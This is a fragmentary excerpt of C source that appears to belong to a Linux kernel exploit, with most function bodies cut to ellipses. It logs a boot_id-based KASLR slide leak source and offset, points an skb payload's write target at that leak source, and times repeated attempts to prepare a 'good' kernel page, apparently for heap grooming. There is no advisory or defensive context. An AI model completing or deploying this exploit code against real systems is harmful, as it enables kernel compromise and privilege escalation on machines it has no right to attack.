...
void log_startup_context(void) {
  ...
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             ...
             "leak_source=%016llx leak_value_off=%016llx\n",
             ...
             (unsigned long long)SLIDE_BOOTID_LEAK_SOURCE,
             (unsigned long long)SLIDE_BOOTID_LEAK_VALUE_OFF);
}
...
int prepare_skb_payload(uintptr_t base, int payload_mode) {
  ...
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_BOOTID_LEAK_SOURCE;
    write_right = 0;
...
uintptr_t prepare_good_kernel_page(int payload_mode) {
  ...
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    ...
    if (base) {
      ...
      pr_info("prepare_good_kernel_page mode=%d attempt=%d/%d elapsed_ms=%ld\n",
              payload_mode, attempt, max_attempts, elapsed_ms);
      return base;
    }
  ...
  long elapsed_ms = (end.tv_sec - start.tv_sec) * 1000L +
                    (end.tv_nsec - start.tv_nsec) / 1000000L;
  pr_info("prepare_good_kernel_page failed mode=%d attempts=%d elapsed_ms=%ld\n",
          payload_mode, max_attempts, elapsed_ms);
